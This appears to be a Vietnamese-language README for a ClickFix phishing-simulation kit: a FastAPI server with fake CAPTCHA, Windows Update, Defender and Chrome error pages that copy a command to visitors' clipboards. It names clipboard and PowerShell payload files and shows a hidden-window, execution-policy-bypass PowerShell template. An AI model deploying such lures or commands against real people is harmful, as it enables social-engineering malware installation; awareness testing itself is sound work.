# ClickFix Demo v2.0

Dynamic lure web server for ClickFix security awareness testing.

## Cấu trúc

```
clickfix-demo/
├── config/
│   ├── main.yaml                    ← cấu hình chính (default lure, server)
│   └── lures/
│       ├── captcha.yaml             ← Cloudflare verification style
│       ├── software_update.yaml     ← Windows 11 Update style
│       ├── fake_update.yaml         ← Windows Defender update style
│       ├── security_alert.yaml       ← Microsoft Defender alert style
│       ├── error_handler.yaml        ← Chrome certificate error style
│       ├── prize_winner.yaml         ← Prize/giveaway celebration
│       ├── flash_sale.yaml           ← E-commerce flash sale
│       └── coupon_captcha.yaml       ← Gift card promo page
│
├── payloads/
│   ├── default.js                   ← Main JS payload (clipboard + tracking)
│   └── default.ps1                  ← PowerShell payload template
│
└── web/
    ├── server.py                    ← FastAPI server v2.0
    └── templates/
        ├── admin.html               ← Admin dashboard
        └── lures/
            ├── captcha.html         ← Cloudflare "Verify you are human"
            ├── software_update.html ← Windows Update Settings page
            ├── security_alert.html   ← Microsoft Defender alert
            ├── error_handler.html    ← Chrome ERR_CERT_AUTHORITY_INVALID
            ├── prize_winner.html     ← Prize winner page with confetti
            ├── flash_sale.html       ← Flash sale e-commerce page
            └── coupon_captcha.html   ← Gift card claim page
```

## Chạy server

```bash
uv sync
uv run python -m web.server --host 0.0.0.0 --port 8080
```

## Các Lure

| URL | Route | Mô tả |
|-----|-------|--------|
| `/xac-minh` | `/lure/captcha` | Cloudflare "Xác minh bạn là người thật" |
| `/cap-nhat-windows` | `/lure/software_update` | Windows 11 Update với lỗi 0x80070005 |
| `/cap-nhat-defender` | `/lure/fake_update` | Windows Defender update lỗi |
| `/canh-bao-bao-mat` | `/lure/security_alert` | Microsoft Defender phát hiện mối đe dọa |
| `/loi-sertifikat` | `/lure/error_handler` | Chrome certificate error page |
| `/trung-thuong` | `/lure/prize_winner` | Thông báo người chiến thắng giải thưởng |
| `/giam-gia-soc` | `/lure/flash_sale` | Khuyến mãi flash sale thương mại điện tử |
| `/uu-dai` | `/lure/coupon_captcha` | Trang nhận thẻ quà tặng |
| `/admin` | — | Dashboard quản trị |

## API Endpoints

| Endpoint | Method | Mô tả |
|----------|--------|-------|
| `/` | GET | Redirect đến default lure |
| `/{slug}` | GET | Truy cập lure qua clean URL (route field trong YAML) |
| `/lure/{name}` | GET | Hiển thị lure (backwards compatibility) |
| `/admin` | GET | Admin dashboard |
| `/api/reload` | GET | **Hot-reload configs** (không restart) |
| `/api/lures` | GET | Danh sách lures |
| `/api/lures/{name}` | GET | Chi tiết lure config |
| `/api/payloads` | GET | Danh sách payloads |
| `/api/payloads/{name}` | GET | Nội dung payload file |
| `/api/logs` | GET | Visit logs |
| `/api/track` | POST | Tracking events từ client |
| `/health` | GET | Health check |

## Thêm Lure Mới (Dynamic!)

1. Tạo `config/lures/my_new_lure.yaml`:
```yaml
type: captcha
route: /ten-rut-gon    # ← Clean URL để truy cập
template: lures/my_new_lure.html  # hoặc để dynamic

payload:
  script: "default.js"

content:
  title: "Tiêu đề tiếng Việt"
  display_command: "powershell ..."
```

2. Tạo `web/templates/lures/my_new_lure.html` (Jinja2 template)

3. Gọi `GET /api/reload` — KHÔNG cần restart!

4. Truy cập `/ten-rut-gon` hoặc `/lure/my_new_lure`

## Thêm Payload Mới

1. Tạo file trong `payloads/my_payload.js`
2. Trong lure config:
```yaml
payload:
  script: "my_payload.js"
```
3. Gọi `/api/reload`

## Template Variables (Jinja2)

```html
{{ content.title }}              <!-- từ lure YAML -->
{{ content.display_command }}     <!-- command hiển thị trong overlay -->
{{ styles.primary_color }}       <!-- màu sắc -->
{{ payload_content | safe }}      <!-- JavaScript payload -->
{{ lure_name }}                  <!-- tên lure -->
```

## Cấu hình display_command

Mỗi lure YAML có field `content.display_command` — đây là lệnh hiển thị trong overlay ClickFix và được copy vào clipboard tự động khi victim click.

```yaml
content:
  display_command: "powershell -w h -ep bypass -c \"...\""
```

---
*Internal use only — Security Awareness Testing*